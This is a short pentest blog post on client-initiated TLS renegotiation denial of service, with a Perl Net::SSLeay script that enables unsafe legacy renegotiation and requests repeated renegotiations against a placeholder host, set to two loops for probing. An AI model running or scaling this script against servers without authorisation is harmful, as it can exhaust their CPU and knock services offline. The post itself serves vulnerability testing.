---
layout: post
title:  "DoSing TLS endpoints"
date:   2021-03-25
categories: pentest perl
author: jasa
---

During these day, I had an interesting task: to test if som specific endpoint is vulnerable against a client-side TLS renegotiation DoS vulnerability.

# The vulnerability

Negotiating a shared secret requires a lot of computation and thus needs some CPU time. The idea of the attack is to initiate a TLS connection and then request a renegotiation of the shared secret over and over again. This would consume a lot of CPU time from the server, which is the resource we're going to exhaust.

# The test

To exploit the vulnerability, you must make sure that the client consume much less CPU time than the server does. So, you have to tweak the renegotiation. I didn't do this, becaus I wasn't interested in really exhausting the server resources. I was only interested in the following questions:

* Does the server really support client-initiated renegotiation?
* How many renegotiations are allowed by the server before it terminates the connection?

# What did I learn?

Most TLS implementations have removed the client-initiated renegotiation from its source code, so If you use an up-to-date implementation, chances are good that you are not vulnerable.

# Expoit source code
```perl
use Socket;
use Net::SSLeay qw(die_now die_if_ssl_error) ;
use strict;
use warnings;
use Errno qw(EINTR EIO :POSIX);
use IO::Socket::INET;

Net::SSLeay::load_error_strings();
Net::SSLeay::SSLeay_add_ssl_algorithms();
Net::SSLeay::randomize();

my $hostname = "<yourhost>";
my $port = "443";
my $request = "HEAD / HTTP/1.1\r\n\r\n";

sub error_name($) {
    my $id = shift;
    my @errors = (
        'SSL_ERROR_NONE',
        'SSL_ERROR_SSL',
        'SSL_ERROR_WANT_READ',
        'SSL_ERROR_WANT_WRITE',
        'SSL_ERROR_WANT_X509_LOOKUP',
        'SSL_ERROR_SYSCALL',
        'SSL_ERROR_ZERO_RETURN',
        'SSL_ERROR_WANT_CONNECT',
        'SSL_ERROR_WANT_ACCEPT'
    );
    die "invalid error number" unless $errors[$id];
    my $result;
    return $errors[$id];
}

sub display_result($$$) {
    my $ssl = shift;
    my $result = shift;
    my $function = shift;

    die_if_ssl_error("ssl $function ($!)");

    if (0 != (my $error_id = Net::SSLeay::get_error($ssl, $result))) {
        my $error = error_name($error_id);
        print ("$function() = $error\n");

        while (0 != (my $rv = Net::SSLeay::ERR_get_error())) {
            my $error_desc = Net::SSLeay::ERR_error_string($rv);
            print ("stack: $error_desc\n");
        }
    }
}

sub set_options($$) {
    my $ctx = shift;
    my $option = shift;
    Net::SSLeay::CTX_set_options($ctx, $option)
     and die_if_ssl_error("ssl ctx set options ($!)");
}

sub set_version($$) {
    my $ctx = shift;
    my $version = shift;
    Net::SSLeay::CTX_set_ssl_version($ctx, $version)
     and die_if_ssl_error("ssl ctx set version ($!)");
}

sub set_ciphers($$) {
    my $ctx = shift;
    my $ciphers = shift;
    Net::SSLeay::CTX_set_cipher_list($ctx, $ciphers)
     and die_if_ssl_error("ssl ctx set ciphers suites ($!)");
}

sub ssl_connect($$) {
    my $ctx = shift;
    my $socket = shift;
    my $ssl = Net::SSLeay::new($ctx) or die_now("Failed to create SSL $!");
    Net::SSLeay::set_fd($ssl, $socket->fileno);
    my $res = Net::SSLeay::connect($ssl) and die_if_ssl_error("ssl connect ($!)");
    my $error = error_name(Net::SSLeay::get_error($ssl, $res));
    print ("connect() = $error\n");
    print "Cipher `" . Net::SSLeay::get_cipher($ssl) . "'\n";
    return $ssl;
}

sub configure_context($$) {
    my $ctx = shift;
    my $ciphers = shift;
    set_options($ctx, &Net::SSLeay::OP_ALL);
    set_options($ctx, &Net::SSLeay::OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION);
    #set_options($ctx, &Net::SSLeay::OP_SSL_OP_LEGACY_SERVER_CONNECT);
    set_version($ctx, &Net::SSLeay::TLSv1_2_method);
    set_ciphers($ctx, $ciphers);
}
my $socket = IO::Socket::INET->new(
    Type => IO::Socket::SOCK_STREAM,
    Proto => 'tcp',
    PeerAddr => $hostname,
    PeerPort => $port,
    Blocking => 1
) or die ("unable to connect: $!\n");

 
my $ctx = Net::SSLeay::CTX_new() or die_now("Failed to create SSL_CTX $!");
configure_context($ctx, "DHE:EDH:ECDHE:EECDH:RSA:DH:ECDH");
my $ssl = ssl_connect($ctx, $socket);

my $ret;
for (my $i=0; $i<2; $i++) {
    Net::SSLeay::renegotiate($ssl);
    die_if_ssl_error("ssl renegotiate ($!)");

    if (! $socket->connected()) {
        die("network connection has died");
    }

    $ret = Net::SSLeay::do_handshake($ssl);
    display_result($ssl, $ret, "do_handshake");
}

Net::SSLeay::free ($ssl);               # Tear down connection
Net::SSLeay::CTX_free ($ctx);
close $socket;
```